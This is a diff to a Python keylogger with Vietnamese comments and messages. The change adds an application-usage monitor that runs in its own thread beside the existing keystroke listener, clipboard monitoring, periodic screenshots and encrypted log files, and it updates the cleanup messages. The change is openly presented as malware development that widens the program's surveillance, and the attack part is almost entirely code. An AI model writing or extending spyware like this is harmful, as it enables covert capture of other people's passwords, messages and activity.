@@ -9,6 +9,7 @@ import signal
 import base64
 from cryptography.fernet import Fernet
 import json
+from app_monitor import AppMonitor
 
 class Keylogger:
     def __init__(self):
@@ -26,6 +27,9 @@ class Keylogger:
         self.running = True
         self.key_count = 0
         self.screenshot_interval = 100  # Số phím trước khi chụp ảnh
+        
+        # Khởi tạo AppMonitor
+        self.app_monitor = AppMonitor(self.log_dir)
         
         # Tạo thư mục log
         self.ensure_log_directory()
@@ -197,7 +201,14 @@ class Keylogger:
             print(f"Log đã được lưu tại: {os.path.abspath(self.log_file)}")
             print(f"Clipboard log đã được lưu tại: {os.path.abspath(self.clipboard_file)}")
             print(f"Ảnh chụp màn hình đã được lưu tại: {os.path.abspath(self.screenshot_dir)}")
-            print("\nĐể giải mã log, chạy lệnh: python decrypt_log.py")
+            print(f"Log ứng dụng đã được lưu tại: {os.path.abspath(os.path.join(self.log_dir, 'app_usage.enc'))}")
+            print("\nĐể giải mã log, chạy các lệnh:")
+            print("- python decrypt_log.py (cho keylog)")
+            print("- python decrypt_app_log.py (cho app usage)")
+            
+            # Dừng giám sát ứng dụng
+            self.app_monitor.stop_monitoring()
+            
         except Exception as e:
             print(f"Lỗi khi dọn dẹp: {e}")
     
@@ -209,6 +220,10 @@ class Keylogger:
             # Bắt đầu theo dõi clipboard trong thread riêng
             clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
             clipboard_thread.start()
+            
+            # Bắt đầu giám sát ứng dụng trong thread riêng
+            app_monitor_thread = threading.Thread(target=self.app_monitor.start_monitoring, daemon=True)
+            app_monitor_thread.start()
             
             # Bắt đầu lắng nghe sự kiện bàn phím
             with keyboard.Listener(
